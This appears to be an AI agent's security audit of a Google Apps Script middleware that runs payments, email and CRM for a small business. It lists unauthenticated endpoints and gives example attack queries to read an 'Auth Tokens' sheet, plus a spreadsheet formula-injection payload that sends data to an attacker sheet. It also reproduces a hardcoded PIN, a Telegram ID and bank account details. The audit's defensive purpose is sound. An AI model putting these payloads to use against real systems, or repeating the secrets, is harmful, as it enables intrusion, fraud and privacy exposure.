# GAS Middleware Audit Report — Agent 3 of 7

**Auditor:** Agent 3 (Google Apps Script Middleware)  
**Date:** 2026-02-22  
**File:** `apps-script/Code.gs` (22,137 lines) — PRIMARY  
**Secondary:** `gas/Code.gs` (19,762 lines) — STALE COPY, 2,374 lines behind  
**Severity Scale:** 🔴 CRITICAL | 🟠 HIGH | 🟡 MEDIUM | 🟢 LOW | ℹ️ INFO

---

## EXECUTIVE SUMMARY

The GAS middleware is a **monolithic 22K-line file** that serves as the central API for the entire 3-node GGM Hub system. It handles Stripe payments, email delivery, CRM data, Telegram bots, and a Supabase dual-write layer. While functional and fairly well-structured, there are **critical security gaps** (unauthenticated admin endpoints), **data exposure risks** (all client PII available without auth), and **scalability concerns** (full-sheet scans on every request). The codebase is production-ready for a small business but needs hardening before it can be considered enterprise-grade.

**Issue Count:** 🔴 8 | 🟠 14 | 🟡 16 | 🟢 7 | ℹ️ 5

---

## 1. API COMPLETENESS — ALL ACTION HANDLERS

### 1.1 doPost Actions (67 routes)

| # | Action | Line | Auth | Lock | Notes |
|---|--------|------|------|------|-------|
| 1 | `track_pageview` | 1413 | ❌ None | ❌ | Public — correct |
| 2 | `validate_mobile_pin` | 1418 | ❌ None | ❌ | 🔴 Hardcoded PIN |
| 3 | `register_push_token` | 1425 | ❌ None | ❌ | 🟠 No validation |
| 4 | `log_mobile_activity` | 1431 | ❌ None | ❌ | Public — OK |
| 5 | (Telegram webhook) | 1437 | ❌ None | ❌ | Auto-detect — OK |
| 6 | `stripe_webhook` | 1444 | Stripe sig | ❌ | ⚠️ Sig verify skipped if no secret |
| 7 | `stripe_subscription` | 1456 | ❌ None | ❌ | 🟠 No auth on payment flow |
| 8 | `booking_payment` | 1461 | ❌ None | ❌ | Public — correct (customer payment) |
| 9 | `booking_deposit` | 1466 | ❌ None | ❌ | Public — correct |
| 10 | `create_quote` | 1471 | ❌ None | ❌ | 🟠 Should require admin |
| 11 | `update_quote` | 1476 | ❌ None | ❌ | 🟠 Should require admin |
| 12 | `resend_quote` | 1481 | ❌ None | ❌ | 🟠 Should require admin |
| 13 | `quote_response` | 1486 | ❌ None | ❌ | Public — correct (customer response) |
| 14 | `quote_deposit_payment` | 1491 | ❌ None | ❌ | Public — correct |
| 15 | `quote_full_payment` | 1496 | ❌ None | ❌ | Public — correct |
| 16 | `update_client` | 1501 | ❌ None | ❌ | 🔴 **No admin auth — can modify any client row** |
| 17 | `update_status` | 1506 | ❌ None | ❌ | 🔴 **No admin auth — can change any job status** |
| 18 | `submit_testimonial` | 1511 | ❌ None | ❌ | Public — correct |
| 19 | `save_blog_post` | 1516 | ❌ None | ❌ | 🟠 No admin auth — anyone can create/edit posts |
| 20 | `delete_blog_post` | 1523 | ✅ Admin | ❌ | Correct |
| 21 | `fetch_blog_image` | 1528 | ❌ None | ❌ | 🟡 Minor — image fetch |
| 22 | `cleanup_blog` | 1533 | ❌ None | ❌ | 🟠 Should require admin |
| 23 | `post_to_facebook` | 1538 | ❌ None | ❌ | 🟡 Should require admin |
| 24 | `save_business_costs` | 1543 | ❌ None | ❌ | 🔴 **No auth — financial data modification** |
| 25 | `send_completion_email` | 1549 | ❌ None | ❌ | 🟠 Should require admin |
| 26 | `sheet_write` | 1554 | ❌ None | ❌ | 🔴 **CRITICAL — arbitrary sheet write with NO auth** |
| 27 | `subscribe_newsletter` | 1559 | ❌ None | ❌ | Public — correct |
| 28 | `unsubscribe_newsletter` | 1564 | ❌ None | ❌ | Public — correct |
| 29 | `send_newsletter` | 1569 | ❌ None | ❌ | 🔴 **No auth — anyone can blast emails to all subscribers** |
| 30 | `generate_schedule` | 1574 | ❌ None | ❌ | 🟠 Should require admin |
| 31 | `send_schedule_digest` | 1579 | ❌ None | ❌ | 🟡 Sends to Telegram (attacker DoS vector) |
| 32 | `cancel_booking` | 1584 | ❌ None | ❌ | 🔴 **No auth — anyone can cancel any booking by job# or row** |
| 33 | `cancel_subscription` | 1589 | Session | ❌ | Correct — uses session validation |
| 34 | `reschedule_booking` | 1607 | ❌ None | ❌ | 🟠 No auth |
| 35 | `send_booking_confirmation` | 1614 | ✅ Admin | ❌ | Correct |
| 36 | `process_email_lifecycle` | 1644 | ❌ None | ❌ | 🟡 Guarded by HUB_OWNS_EMAILS flag |
| 37 | `run_financial_dashboard` | 1649 | ❌ None | ❌ | 🟡 Read-heavy, low risk |
| 38 | `update_pricing_config` | 1654 | ❌ None | ❌ | 🟠 Should require admin |
| 39 | `save_business_recommendation` | 1659 | ❌ None | ❌ | 🟡 Low-risk write |
| 40 | `send_enquiry_reply` | 1664 | ❌ None | ❌ | 🟠 Can send emails on your behalf |
| 41 | `update_savings_pots` | 1669 | ❌ None | ❌ | 🟠 Financial data modification |
| 42 | `request_login_link` | 1674 | ❌ None | ❌ | Public — correct |
| 43 | `verify_login_token` | 1679 | ❌ None | ❌ | Public — correct |
| 44 | `update_customer_profile` | 1684 | Session | ❌ | Correct |
| 45 | `update_email_preferences` | 1689 | Session | ❌ | Correct |
| 46 | `delete_customer_account` | 1694 | Session | ❌ | Correct — GDPR compliant |
| 47 | `clear_newsletters_month` | 1699 | ❌ None | ❌ | 🟡 Should require admin |
| 48 | `stripe_invoice` | 1704 | ❌ None | ❌ | 🟠 Creates Stripe invoices with no auth |
| 49 | `send_invoice_email` | 1709 | ❌ None | ❌ | 🟠 Sends invoice emails with no auth |
| 50 | `mark_invoice_paid` | 1716 | ❌ None | ✅ | 🔴 **No auth — can mark any invoice as paid** |
| 51 | `mark_invoice_void` | 1738 | ❌ None | ❌ | 🟠 No auth on voiding invoices |
| 52 | `bespoke_enquiry` | 1745 | ❌ None | ❌ | Public — correct |
| 53 | `service_enquiry` | 1750 | ❌ None | ❌ | Public — correct |
| 54 | `test_email` | 1755 | ❌ None | ❌ | 🟡 Diagnostic — should require admin |
| 55 | `subscription_request` | 1829 | ❌ None | ❌ | Public — correct |
| 56 | `chatbot_message` | 1834 | ❌ None | ❌ | Public — correct |
| 57 | `relay_telegram` | 1839 | ❌ None | ❌ | 🟠 **Anyone can send Telegram messages as the bot** |
| 58 | `relay_telegram_document` | 1848 | ❌ None | ❌ | 🟠 Same as above with files |
| 59 | `relay_telegram_photo` | 1910 | ❌ None | ❌ | 🟠 Same as above with photos |
| 60 | `upload_enquiry_photo` | 1862 | ❌ None | ❌ | 🟡 File upload to Drive |
| 61 | `validate_discount_code` | 1867 | ❌ None | ❌ | Public — correct |
| 62 | `save_discount_code` / `toggle_discount_code` | 1872/1877 | ❌ None | ❌ | 🟠 Should require admin |
| 63 | `delete_discount_code` | 1882 | ✅ Admin | ❌ | Correct |
| 64 | `delete_schedule_entry` | 1895 | ✅ Admin | ❌ | Correct |
| 65 | `purge_all_data` | 1907 | ✅ Admin | ❌ | Correct |
| 66 | `contact_enquiry` | 1935 | ❌ None | ❌ | Public — correct |
| 67 | `save_product` | 1940 | ❌ None | ❌ | 🟠 Should require admin |
| 68 | `delete_product` | 1945 | ✅ Admin | ❌ | Correct |
| 69 | `shop_checkout` | 1950 | ❌ None | ❌ | Public — correct |
| 70 | `update_order_status` | 1955 | ❌ None | ❌ | 🟠 Should require admin |
| 71 | `free_visit` | 1961 | ❌ None | ❌ | Public — correct |
| 72 | `post_vacancy` | 1966 | ❌ None | ❌ | 🟠 Should require admin |
| 73 | `delete_vacancy` | 1973 | ✅ Admin | ❌ | Correct |
| 74 | `delete_client` | 1979 | ✅ Admin | ❌ | Correct |
| 75 | `delete_clients_batch` | 1993 | ✅ Admin | ❌ | Correct |
| 76 | `cleanup_empty_rows` | 1999 | ✅ Admin | ❌ | Correct |
| 77 | `delete_invoice` | 2005 | ✅ Admin | ❌ | Correct |
| 78 | `delete_quote` | 2018 | ✅ Admin | ❌ | Correct |
| 79 | `delete_enquiry` | 2033 | ✅ Admin | ❌ | Correct |
| 80 | `submit_application` | 2051 | ❌ None | ❌ | Public — correct |
| 81 | `submit_complaint` / `resolve_complaint` / `update_complaint_status` / `update_complaint_notes` | 2056-2080 | ❌ None | ❌ | 🟡 resolve/update should require admin |
| 82 | `save_alloc_config` | 2085 | ❌ None | ❌ | 🟡 Finance config |
| 83 | `setup_sheets` | 2092 | ✅ Admin | ❌ | Correct |
| 84 | `mobile_update_job_status` / `mobile_start_job` / `mobile_complete_job` / `mobile_send_invoice` / `mobile_upload_photo` | 2099-2123 | ❌ None | ❌ | 🟠 Mobile endpoints with no auth |
| 85 | `save_risk_assessment` / `save_job_expense` / `submit_client_signature` | 2128-2142 | ❌ None | ❌ | 🟡 Field ops |
| 86 | `queue_remote_command` / `update_remote_command` | 2147-2162 | ❌ None | ❌ | 🟠 Can queue commands for PC Hub without auth |
| 87 | `save_field_note` | 2167 | ❌ None | ❌ | OK |
| 88 | `update_booking_status` | 2172 | ❌ None | ❌ | 🟠 No auth |
| 89 | `node_heartbeat` | 2178 | ❌ None | ❌ | OK — heartbeats are low-risk |
| 90 | `update_invoice` / `update_enquiry` | 2191-2200 | ❌ None | ❌ | 🟠 No auth on data updates |
| 91 | `send_email` | 2207 | ❌ None | ❌ | 🔴 **Generic email endpoint — anyone can send emails as GGM** |
| 92 | `test_supabase` | 2255 | ❌ None | ❌ | 🟡 Diagnostic |
| 93 | (Default booking flow) | 2270-2370 | ❌ None | ✅ | Public booking — correct, uses LockService |

### 1.2 doGet Actions (53 routes)

| # | Action | Line | Auth | Notes |
|---|--------|------|------|-------|
| 1 | `service_enquiry` | 2390 | ❌ | Public fallback — OK |
| 2 | `check_availability` | 2418 | ❌ | Public — OK |
| 3 | `get_clients` | 2423 | ❌ | 🔴 **Returns ALL client PII (name, email, phone, address) with no auth** |
| 4 | `get_email_workflow_status` | 2428 | ❌ | 🟡 Admin data, no auth |
| 5 | `get_bookings` | 2434 | ❌ | 🟠 Booking data, no auth |
| 6 | `verify_customer` | 2439 | ❌ | Public — OK |
| 7 | `get_testimonials` | 2444 | ❌ | Public — OK |
| 8 | `get_blog_posts` | 2449 | ❌ | Public — OK |
| 9 | `get_all_blog_posts` | 2454 | ❌ | 🟡 Editor data, could be admin-gated |
| 10 | `get_business_costs` | 2459 | ❌ | 🟠 **Financial data exposed without auth** |
| 11 | `get_invoices` | 2464 | ❌ | 🔴 **All invoice data (amounts, emails) exposed without auth** |
| 12 | `get_job_photos` | 2469 | ❌ | 🟡 Photo URLs |
| 13 | `get_all_job_photos` | 2476 | ❌ | 🟡 All photo metadata |
| 14 | `sheet_tabs` | 2495 | ❌ | 🟡 Reveals sheet structure |
| 15 | `get_todays_jobs` | 2500 | ❌ | 🟠 Today's job details without auth |
| 16 | `sheet_read` | 2505 | ❌ | 🔴 **Arbitrary sheet read — any tab, any range, no auth** |
| 17 | `backfill_job_numbers` | 2512 | ❌ | 🟠 Write operation via GET, no auth |
| 18 | `get_subscribers` | 2517 | ❌ | 🟠 **All subscriber emails exposed without auth** |
| 19 | `get_newsletters` | 2522 | ❌ | 🟡 Newsletter history |
| 20 | `unsubscribe` | 2527 | ❌ | Public — OK |
| 21 | `get_subscription_schedule` | 2532 | ❌ | 🟡 |
| 22 | `get_schedule` | 2537 | ❌ | 🟠 Schedule data |
| 23 | `get_schedule_range` | 2543 | ❌ | 🟠 Schedule data |
| 24 | `get_subscriptions` | 2549 | ❌ | 🟠 Subscription data |
| 25 | `cancel_page` | 2554 | ❌ | Public — OK |
| 26 | `suggest_alternatives` | 2559 | ❌ | Public — OK |
| 27 | `weather_reschedule` | 2564 | ❌ | Public — OK |
| 28 | `get_weather` | 2569 | ❌ | Public — OK |
| 29 | `unsubscribe_service` | 2578 | ❌ | Public — OK |
| 30 | `get_email_history` | 2583 | ❌ | 🟠 Email history without auth |
| 31 | `get_financial_dashboard` | 2588 | ❌ | 🟠 Financial data without auth |
| 32 | `get_pricing_config` | 2593 | ❌ | 🟡 |
| 33 | `get_business_recommendations` | 2598 | ❌ | 🟡 |
| 34 | `get_savings_pots` | 2603 | ❌ | 🟠 Financial data |
| 35 | `get_job_costs` | 2608 | ❌ | 🟠 Financial data |
| 36 | `get_finance_summary` | 2613 | ❌ | 🟠 Financial data |
| 37 | `get_customer_portal` | 2618 | Session | Correct |
| 38 | `get_subscription_portal` | 2623 | ❌ | 🟡 By job number |
| 39 | `get_chat_replies` | 2628 | ❌ | 🟡 |
| 40 | `get_quotes` | 2633 | ❌ | 🟠 All quotes without auth |
| 41 | `get_quote` | 2638 | Token | Correct — uses token |
| 42 | `get_busy_dates` | 2643 | ❌ | Public — OK |
| 43 | `get_products` | 2648 | ❌ | Public — OK |
| 44 | `get_orders` | 2653 | ❌ | 🟠 All orders without auth |
| 45 | `get_vacancies` / `get_all_vacancies` | 2658/2663 | ❌ | Public/🟡 |
| 46 | `get_applications` | 2668 | ❌ | 🟠 Application data without auth |
| 47 | `get_complaints` | 2673 | ❌ | 🟠 Complaint data without auth |
| 48 | `get_alloc_config` | 2678 | ❌ | 🟡 |
| 49 | `get_enquiries` | 2683 | ❌ | 🟠 All enquiries without auth |
| 50 | `get_discount_codes` | 2688 | ❌ | 🟡 |
| 51 | `get_free_visits` | 2693 | ❌ | 🟠 |
| 52 | `get_weather_log` | 2700 | ❌ | 🟡 |
| 53 | `get_all_testimonials` | 2705 | ❌ | 🟡 |
| 54 | `get_site_analytics` | 2710 | ❌ | 🟡 |
| 55 | `get_remote_commands` | 2715 | ❌ | 🟠 Command queue without auth |
| 56 | `get_email_tracking` | 2720 | ❌ | 🟠 Email history |
| 57 | `get_job_tracking` / `get_field_notes` / `get_risk_assessment` / `get_job_expenses` | 2725-2745 | ❌ | 🟡 |
| 58 | `get_mobile_activity` | 2750 | ❌ | 🟡 |
| 59 | `get_mobile_push_tokens` | 2755 | ❌ | 🟡 |
| 60 | `get_node_status` | 2761 | ❌ | OK |
| 61 | `get_telegram_updates` | 2767 | ❌ | 🟠 Proxies Telegram API without auth |
| 62 | `get_bot_messages` | 2779 | ❌ | 🟡 |

---

## 2. SECURITY ISSUES

### 🔴 S-01: Unauthenticated Administrative Write Operations
**Lines:** 1501, 1506, 1549, 1554, 1569, 1584, 1709, 1716, 2207  
**Impact:** CRITICAL  

The following endpoints modify critical business data with **zero authentication**:

| Endpoint | Risk | Line |
|----------|------|------|
| `update_client` | Modify any client record by rowIndex | 1501 |
| `update_status` | Change any job status (including to "Completed" which triggers auto-invoicing) | 1506 |
| `sheet_write` | **Arbitrary write to ANY sheet, ANY range** — complete data destruction possible | 1554 |
| `send_newsletter` | Email blast to all subscribers — spam/phishing vector | 1569 |
| `cancel_booking` | Cancel any booking by job number — financial loss | 1584 |
| `mark_invoice_paid` | Mark any invoice as paid without payment — fraud vector | 1716 |
| `send_email` | Send arbitrary email from info@gardnersgm.co.uk — phishing | 2207 |
| `save_business_costs` | Falsify financial records | 1543 |

**Fix:** Add `if (!isAdminAuthed(data)) return unauthorisedResponse();` to all admin-facing POST endpoints.

### 🔴 S-02: Unauthenticated Data Exposure via GET Endpoints
**Lines:** 2423, 2459, 2464, 2505, 2517  
**Impact:** CRITICAL — GDPR violation potential

| Endpoint | Data Exposed |
|----------|-------------|
| `get_clients` (L2423) | **ALL client PII** — names, emails, phones, addresses, postcodes, job history |
| `get_invoices` (L2464) | All invoice amounts, client emails, payment status |
| `sheet_read` (L2505) | **ANY sheet tab, any range** — attacker can read Auth Tokens sheet |
| `get_subscribers` (L2517) | All newsletter subscriber emails |
| `get_business_costs` (L2459) | Full financial records |

The `sheet_read` endpoint is especially dangerous — an attacker could read:
- `?action=sheet_read&tab=Auth Tokens` — steal all login tokens and session tokens
- `?action=sheet_read&tab=Jobs` — dump all client data
- `?action=sheet_read&tab=Invoices` — read all financial records

**Fix:** Add `adminKey` query parameter check to all admin GET endpoints. For `sheet_read`/`sheet_write`, require admin auth unconditionally.

### 🔴 S-03: Hardcoded Mobile PIN
**Line:** 1419  
```javascript
var MOBILE_PIN = '2383';
```
A 4-digit PIN hardcoded in source code. Anyone with access to the GAS deployment URL can brute-force this in 10,000 attempts.

**Fix:** Move to Script Properties. Add rate limiting (count failed attempts per IP per hour via PropertiesService). Consider replacing with proper TOTP or token-based auth.

### 🟠 S-04: Telegram Relay Endpoints — Bot Impersonation
**Lines:** 1839, 1848, 1910  
The `relay_telegram`, `relay_telegram_document`, and `relay_telegram_photo` endpoints allow anyone with the webhook URL to send arbitrary messages through the GGM Telegram bots with no authentication.

**Fix:** Add `isAdminAuthed(data)` check.

### 🟠 S-05: Stripe Webhook Signature Verification Bypass
**Line:** 127  
```javascript
if (!secret) return true; // Skip verification if no secret set
```
If `STRIPE_WEBHOOK_SECRET` is not set in Script Properties, ALL Stripe webhooks are accepted without verification. An attacker could craft fake `invoice.paid` events to mark invoices as paid.

**Fix:** If no secret is set, **reject** the webhook rather than accepting it.

### 🟠 S-06: Fallback Chat ID Hardcoded
**Line:** 1257  
```javascript
var TG_CHAT_ID = PropertiesService.getScriptProperties().getProperty('TG_CHAT_ID') || '6200151295';
```
A real Telegram user ID is hardcoded as fallback. This should be in Script Properties only.

### 🟠 S-07: Bank Account Details in Source Code
**Lines:** ~14670-14680  
The invoice email function contains hardcoded bank details:
```
Sort Code: 04-00-03 / Account: 39873874
```
While necessary for invoices, these should be loaded from Script Properties to facilitate rotation.

### 🟠 S-08: No Input Sanitisation Before Sheet Writes
**Lines:** Multiple (all appendRow calls)  
User-provided input (names, emails, notes) is written directly to sheets without sanitisation. While Google Sheets doesn't execute JavaScript like a browser, formulas injected via `=` prefixed values could execute sheet functions.

Example: A customer submitting name `=IMPORTRANGE("attacker_sheet_id","Sheet1!A1")` could potentially exfiltrate data.

**Fix:** Prefix all user-provided text fields with `'` (apostrophe) or validate against `=`, `+`, `-`, `@` prefixed strings.

---

## 3. DATA VALIDATION

### 🟡 V-01: Email Validation Missing
**Lines:** All form handlers  
No email format validation anywhere. `sendEmail()` at L1106 checks for `!opts.to` but doesn't validate format. Invalid emails waste Brevo API quota and could cause delivery issues.

**Fix:** Add regex validation: `/^[^\s@]+@[^\s@]+\.[^\s@]+$/`

### 🟡 V-02: Price/Amount Fields Not Validated
**Lines:** 4646, 4789 (booking payments)  
`data.amount` is passed directly to Stripe. While Stripe validates this, malformed values could cause confusing errors.

### 🟡 V-03: Row Index Injection (updateClientRow)
**Line:** 7013  
`var rowIndex = data.rowIndex;` — if an attacker provides `rowIndex: 1`, they can overwrite the header row. The check `rowIndex < 2` prevents this, but `rowIndex: 0` or `rowIndex: -1` could cause errors (not exploitable, but unhandled).

### 🟡 V-04: Date Parsing Inconsistency
Multiple date formats coexist: ISO strings, `DD/MM/YYYY`, JS Date objects. The `normaliseDateToISO()` function handles this, but some handlers call it and others don't, leading to potential date comparison failures.

---

## 4. ERROR HANDLING

### 🟢 E-01: Top-Level Try/Catch in doPost and doGet
**Lines:** 1406-2380 (doPost), 2385-2793 (doGet)  
Both entry points wrap their entire body in try/catch and return proper JSON error responses. ✅ Good.

### 🟡 E-02: Silent Failures in Supabase Mirror
**Lines:** 887-1090  
The `mirrorActionToSupabase()` function catches all errors silently. If Supabase is misconfigured, data will silently fail to dual-write with no alerts.

**Fix:** Add a Telegram notification after N consecutive mirror failures.

### 🟡 E-03: Missing Error Returns in Some Handlers
Several handler functions don't explicitly return ContentService responses on error paths:
- `handleBookingPayment` at L4646 — some error paths throw instead of returning JSON
- `sendInvoiceEmail` at L4567 — throws on missing email, but caller at L1709 doesn't wrap in try/catch properly

### 🟡 E-04: processBookingPostTasks Trigger Cleanup
**Line:** 4998-5007  
The cleanup deletes **ALL** `processBookingPostTasks` triggers, including any that may have been created for a different booking that hasn't run yet. If two bookings occur within milliseconds, the second trigger could be deleted before it fires.

**Fix:** Use `ScriptApp.getProjectTriggers()` and match by trigger ID rather than handler name, or use a single persistent trigger with PropertiesService queue.

---

## 5. CONCURRENCY / LOCKING

### LockService Usage Summary

| Operation | Uses Lock | Line | Risk |
|-----------|-----------|------|------|
| Booking slot reservation | ✅ | 2277 | OK — prevents double bookings |
| `generateJobNumber()` | ✅ | 3419 | OK — prevents duplicate job numbers |
| `backfillJobNumbers()` | ✅ | 3450 | OK |
| `generateInvoiceNumber()` | ✅ | 12555 | OK |
| `updateInvoiceStatus()` | ✅ | 12601 | OK |
| `updateInvoiceByNumber()` | ✅ | 12626 | OK |

### 🟠 C-01: Missing Locks on Critical Write Operations

| Operation | Should Lock | Line |
|-----------|-------------|------|
| `updateClientRow()` | YES — concurrent Hub + manual updates can overwrite | 7013 |
| `updateClientStatus()` | YES — same risk | 7061 |
| `saveBlogPost()` | YES — duplicate detection race condition | 7297 |
| `subscribeNewsletter()` | YES — duplicate subscriber detection | 8647 |
| `logInvoice()` | YES — concurrent invoice creation | 12580 |
| `cancelBooking()` | YES — double-cancel + refund race | 3780 |
| `sendNewsletter()` | YES — prevent double-sends | 8870 |
| `sheetWriteRange()` | YES — arbitrary write conflicts | 3377 |

Most critically, `sendNewsletter()` has no lock — if called twice in quick succession (e.g., Hub trigger + manual click), all subscribers would receive duplicate emails.

### 🟡 C-02: generateJobNumber() Race Condition
**Line:** 3419-3445  
The lock protects the scan and number generation, but the actual row append happens OUTSIDE the lock (at L2323). Between `generateJobNumber()` releasing the lock and `sheet.appendRow()` executing, another concurrent request could generate the same next number.

**Fix:** Move the `appendRow()` inside the lock scope, or write a reservation marker.

---

## 6. FINANCIAL DATA HANDLING

### 🟡 F-01: Invoice Number Generation — Collision Risk
**Line:** 12555  
`generateInvoiceNumber()` uses LockService correctly, but the pattern scans ALL rows to find the max. At 10,000+ invoices, this scan takes seconds.

### 🟡 F-02: No Xero Integration
The invoice structure (Invoices sheet columns A-O) is a flat sheet format. For Xero compatibility, you would need:
- Tax rate fields (VAT 20%)  
- Account codes (4000 for revenue, etc.)
- Due date formatting (ISO)
- Customer reference matching

Current columns: `Invoice Number, Job Number, Client Name, Email, Amount (£), Status, Stripe Invoice ID, Payment URL, Date Issued, Due Date, Date Paid, Payment Method, Before Photos, After Photos, Notes`

**Missing for Xero:** Tax amount, Tax rate, Account code, Currency code (GBP), Line items breakdown, Payment reference

### 🟡 F-03: Amounts Stored as Strings
Throughout the code, prices are handled as strings (`data.price || '0.00'`). This works but is error-prone for calculations. The `parseFloat` calls are scattered and inconsistent.

### ℹ️ F-04: Three-Layer Invoice Matching (Stripe Webhooks)
**Lines:** 241-300  
The `handleStripeInvoicePaid()` function has a 3-tier fallback for matching invoices:
1. By Stripe invoice ID → Invoices sheet
2. By email + "Sent" status → Invoices sheet
3. By email + job status → Jobs sheet

This is well-designed for resilience but could mark the wrong invoice as paid if a customer has multiple outstanding invoices (email match is not unique).

---

## 7. EMAIL SYSTEM

### 7.1 Email Architecture
- **Primary provider:** Brevo SMTP API (lines 1106-1170)
- **Fallback:** NONE (MailApp fallback was removed — line 1165 throws on Brevo failure)
- **Retry:** 2 retries on Brevo 5xx errors with exponential backoff (L1148-1150)
- **Tracking:** All emails logged to "Email Tracking" sheet (L9541)
- **Alert on failure:** Telegram notification on any send failure (L1168)

### 7.2 HUB_OWNS_EMAILS Flag
**Line:** 42 — `var HUB_OWNS_EMAILS = true;`

Checked in these functions:
| Function | Line | Behaviour |
|----------|------|-----------|
| `handleStripeInvoicePaid` | 304 | Skips payment receipt email |
| `handlePaymentIntentSucceeded` | 678 | Skips payment receipt email |
| `sendCancellationEmail` | 4276 | Skips entirely — returns void |
| `sendRescheduleEmail` | 4331 | Skips entirely — returns void |
| `processBookingPostTasks` | 4938 | Skips booking confirmation |
| `sendCompletionEmail` | 8193 | Skips unless `_fromHub` flag set |
| `processEmailLifecycle` | 10271 | Skips entire lifecycle engine |

### 🟡 EM-01: Hub-Requested Emails Still Send Without Auth
When Hub sends `action=send_email` (L2207), it routes through `sendEmail()` with no auth check. The `_fromHub` flag on `sendCompletionEmail` (L8193) is a boolean in the request payload — any caller can set it.

### 7.3 All Email-Sending Functions (22 total)

| # | Function | Line | Type |
|---|----------|------|------|
| 1 | `sendEmail()` | 1106 | Core transport (Brevo) |
| 2 | `sendBookingConfirmation()` | ~4200 | Booking confirmation |
| 3 | `sendCancellationEmail()` | 4273 | Cancellation |
| 4 | `sendRescheduleEmail()` | 4328 | Reschedule |
| 5 | `sendQuoteEmail()` | 6240 | Quote to customer |
| 6 | `sendQuoteDepositConfirmationEmail()` | 6355 | Quote deposit confirm |
| 7 | `sendCompletionEmail()` | 8190 | Job completion + review |
| 8 | `sendWelcomeEmail()` | 8724 | Newsletter welcome |
| 9 | `sendNewsletter()` | 8870 | Bulk newsletter |
| 10 | `sendAftercareEmail()` | 9751 | 72hr aftercare |
| 11 | `sendFollowUpEmail()` | 9830 | Follow-up |
| 12 | `sendScheduleUpdateEmail()` | 9883 | Schedule update |
| 13 | `sendSeasonalTipsEmail()` | 9926 | Seasonal tips |
| 14 | `sendReEngagementEmail()` | 9968 | Re-engagement |
| 15 | `sendPromotionalEmail()` | 10082 | Promotional |
| 16 | `sendReferralEmail()` | 10158 | Referral request |
| 17 | `sendPackageUpgradeEmail()` | 10202 | Upgrade pitch |
| 18 | `sendInvoiceEmail()` | 14567 | Invoice with photos |
| 19 | `sendPaymentReceivedEmail()` | 14720 | Payment receipt |
| 20 | `sendPayLaterInvoiceEmail()` | 15838 | Pay-later invoice |
| 21 | `sendSubscriberContractEmail()` | 15949 | Subscriber contract |
| 22 | `sendWeatherCancellationEmail()` | 19686 | Weather cancel |

---

## 8. TRIGGER MANAGEMENT

### 8.1 Cloud Triggers (11 total)

| # | Function | Schedule | Line |
|---|----------|----------|------|
| 1 | `processJobStatusProgression` | Daily 6:00am | 17626 |
| 2 | `cloudMorningBriefingWeek` | Daily 6:15am | 17586 |
| 3 | `coachMorningNudge` | Daily 6:30am | 17633 |
| 4 | `cloudMorningBriefingToday` | Daily 6:45am | 17594 |
| 5 | `cloudEmailLifecycle` | Daily 7:30am | 17602 |
| 6 | `cloudGenerateBlogPost` | Daily 8:00am | 17618 |
| 7 | `cloudWeeklyNewsletter` | Monday 9:00am | 17610 |
| 8 | `coachMidMorningNudge` | Daily 10:00am | 17641 |
| 9 | `coachLunchNudge` | Daily 12:30pm | 17649 |
| 10 | `coachAfternoonNudge` | Daily 3:00pm | 17657 |
| 11 | `coachEveningNudge` | Daily 5:30pm | 17665 |

**Plus separate trigger:**
| 12 | `checkWeatherAndAlert` | Daily 6:00pm | 19972 |

### 🟢 T-01: Trigger Deduplication
`setupAllCloudTriggers()` (L17558) properly deletes existing triggers by handler name before recreating them. ✅ Good.

### 🟡 T-02: Ephemeral Post-Task Triggers
**Lines:** 4759, 4892, 6574  
`processBookingPostTasks` and `processSubscriptionPostTasks` create one-shot triggers with `ScriptApp.newTrigger().timeBased().after(3000)`. These self-delete after execution (L4998), but if the trigger fails, it will never run again and the cleanup task (email, calendar sync) is lost.

**Fix:** Add a periodic "orphaned post-task checker" trigger that scans for stale `BOOKING_POST_*` properties.

### 🟡 T-03: GAS Trigger Limit Risk
Google Apps Script has a limit of 20 project triggers. You currently use 12 persistent triggers plus ephemeral booking triggers. Under heavy booking load (e.g., 10 bookings in one minute), you could temporarily exceed the 20-trigger limit.

---

## 9. SHEET STRUCTURE

### 9.1 Sheets Referenced in Code

| Sheet Name | Created At | Headers |
|------------|-----------|---------|
| **Jobs** | setupSheetsOnce (L15011) | Timestamp, Type, Name, Email, Phone, Address, Postcode, Service, Date, Time, Preferred Day, Status, Price (£), Distance, Drive Time, Maps/URL, Notes, Paid, Payment Type, Job Number, Travel Surcharge |
| **Invoices** | ensureInvoicesSheet (L12488) | Invoice Number, Job Number, Client Name, Email, Amount (£), Status, Stripe Invoice ID, Payment URL, Date Issued, Due Date, Date Paid, Payment Method, Before Photos, After Photos, Notes |
| **Job Photos** | ensureJobPhotosSheet (L12519) | Job Number, Type, Photo URL, File ID, Telegram File ID, Uploaded, Caption |
| **Blog** | saveBlogPost (L7302) | ID, Date, Title, Category, Author, Excerpt, Content, Status, Tags, Social_FB, Social_IG, Social_X, ImageUrl |
| **Subscribers** | subscribeNewsletter (L8656) | Email, Name, Tier, Source, Date, Status, Token |
| **Newsletters** | sendNewsletter (L8942) | Date, Subject, Target, Sent, Failed, Content Preview, Topics Covered, Blog Titles Suggested |
| **Email Tracking** | trackEmail (L9537) | Date, Email, Name, Type, Service, Job Number, Subject, Status |
| **Email Preferences** | (L9590) | Email, Reminders, Aftercare, Follow-ups, Seasonal, Updated |
| **Enquiries** | handleServiceEnquiry (L15260) | Timestamp, Name, Email, Phone, Description, Status, Type, PhotoURLs, DiscountCode, GardenDetails, Address, Postcode, PreferredDate, PreferredTime |
| **Schedule** | generateSchedule (L3033) | Dynamic |
| **Site Analytics** | ensureSiteAnalyticsSheet (L2799) | Timestamp, Page, Title, Referrer, ScreenWidth, ScreenHeight, Language, Date, Hour |
| **Auth Tokens** | (L11687) | Email, Token, Created, Expires, Used, Session Token, Session Expires |
| **Chat Replies** | ensureChatRepliesSheet (L12540) | Timestamp, Reply To Message ID, Reply Text, Status |
| **Free Visits** | handleFreeVisitRequest (L15128) | Timestamp, Name, Email, Phone, Postcode, Address, Date, Time, Garden Size, Notes, Status, Job Number |
| **Quotes** | Dynamic | Dynamic |
| **Products** | Dynamic | Dynamic |
| **Orders** | Dynamic | Dynamic |
| **Vacancies** | Dynamic | Dynamic |
| **Applications** | Dynamic | Dynamic |
| **Complaints** | Dynamic | Dynamic |
| **Business Costs** | Dynamic | Dynamic |
| **Financial Dashboard** | Dynamic | Dynamic |
| **Risk Assessments** | Dynamic | Dynamic |
| **Job Expenses** | Dynamic | Dynamic |
| **Job Signoffs** | submitClientSignature (L22106) | Timestamp, JobRef, ClientName, SignatureData, Notes, NodeID |
| **Weather Log** | Dynamic | Dynamic |
| **Discount Codes** | Dynamic | Dynamic |
| **Remote Commands** | Dynamic | Dynamic |
